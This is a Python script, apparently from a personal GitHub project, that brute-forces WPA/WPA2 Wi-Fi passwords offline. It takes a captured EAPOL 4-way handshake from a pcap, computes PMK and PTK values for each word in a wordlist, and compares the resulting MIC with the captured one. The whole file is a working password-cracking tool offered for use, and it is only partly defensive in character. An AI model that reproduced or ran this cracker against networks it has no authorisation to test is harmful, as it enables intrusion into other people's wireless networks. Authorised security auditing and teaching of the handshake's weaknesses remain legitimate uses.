#coding: utf-8

"""
Script to find the wifi password from the captured eapol 4-Way handshake
an implementation of the pmkid attack will be make soon
Author: Njörd
github: https://github.com/Njord0/
"""

from datetime import datetime

import argparse
import binascii
import hashlib
import hmac
import os
import sys

parser = argparse.ArgumentParser()
# parser.add_argument("-s", "--ssid", help="Access point SSID, a wrong SSID will make the whole program useless", required=True)
parser.add_argument("-w", "--wordlist", help="The wordlist for the bruteforce", required=True)
parser.add_argument("-p", "--pcap", help="The pcap where EAPOL authentication is", required=True)
args = parser.parse_args()



def calc_ptk(key, A, B):
    blen = 64
    i = 0
    R = b""

    while i<=((blen*8+159) /160):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()

    return R[:blen]

def calc_pmk(ssid, password):
    pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    return pmk

def get_bssid(messages):
    return messages["message_1"].addr2

def get_ssid(beacon_frame):
        return beacon_frame[Dot11Elt].info if not b"\x00" in beacon_frame[Dot11Elt].info and beacon_frame[Dot11Elt].info != "" else ""

def get_eapol(pcap):
    packets_list = rdpcap(pcap)

    messages = {}

    for packet in packets_list:
        if packet.haslayer(EAPOL):
            packet_raw = binascii.hexlify(packet[Raw].load)
            if packet_raw[2:6].decode() == "008a": #message_1
                messages["message_1"] = packet
                
            elif packet_raw[2:6].decode() == "010a": #message_2
                messages["message_2"] = packet

            elif packet_raw[2:6].decode() == "13ca": #message_3
                messages["message_3"] = packet

            elif packet_raw[2:6].decode() == "030a": #message_4
                messages["message_4"] = packet

        elif packet.haslayer(Dot11Beacon):
            messages["message_ssid"] = get_ssid(packet).decode()

            if not messages["message_1"].addr3 == packet.addr3:
                sys.exit("[!] Could not find a suitable beacon for this wpa_handshake...")

            if len(messages) == 5:
                return messages

def main(wordlist, pcap):
    
    messages = get_eapol(pcap)

    ap_mac = get_bssid(messages).replace(":", "")
    ap_mac = binascii.a2b_hex(ap_mac)

    client_mac = messages["message_1"].addr1.replace(":", "")
    client_mac = binascii.a2b_hex(client_mac)

    aNonce = binascii.hexlify(messages["message_1"][Raw].load)[26:90]
    aNonce = binascii.a2b_hex(aNonce)

    sNonce = binascii.hexlify(messages["message_2"][Raw].load)[26:90]
    sNonce = binascii.a2b_hex(sNonce)

    pke = b"Pairwise key expansion"

    key_data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(aNonce, sNonce) + max(aNonce, sNonce)

    message_integrity_check = binascii.hexlify(messages["message_2"][Raw].load)[154:186]

    wpa_data = binascii.hexlify(bytes(messages["message_2"][EAPOL]))
    wpa_data = wpa_data.replace(message_integrity_check, b"0" * 32)
    wpa_data = binascii.a2b_hex(wpa_data)

    print("[+] Find correct EAPOL authentication for {} / {}".format(messages["message_ssid"], get_bssid(messages)))

    input("Press enter to start cracking...")
    
    start_time = datetime.now()

    with open(wordlist, "r") as passwords:

        i = 0
        for password in passwords.readlines():
            password = password.replace("\n", "")
            i += 1

            pairwise_master_key = calc_pmk(messages["message_ssid"], password)

            pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data)

            mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()

            
            if mic[:-8] == message_integrity_check.decode():
                running_time = datetime.now() - start_time

                print("\n[+] Password found: {} ({} seconds)".format(password, running_time))
                print("[+] Tried {} passwords".format(i))
                break

        else:
            print("[!] Password not found")

if __name__ == "__main__":

    print("[+] Importing scapy...", end="")
    try:
        from scapy.all import *
    except ImportError:
        sys.exit("\n[!] Error happened while importing scapy")
    else:
        print("Done.\n")

    main(args.wordlist, args.pcap)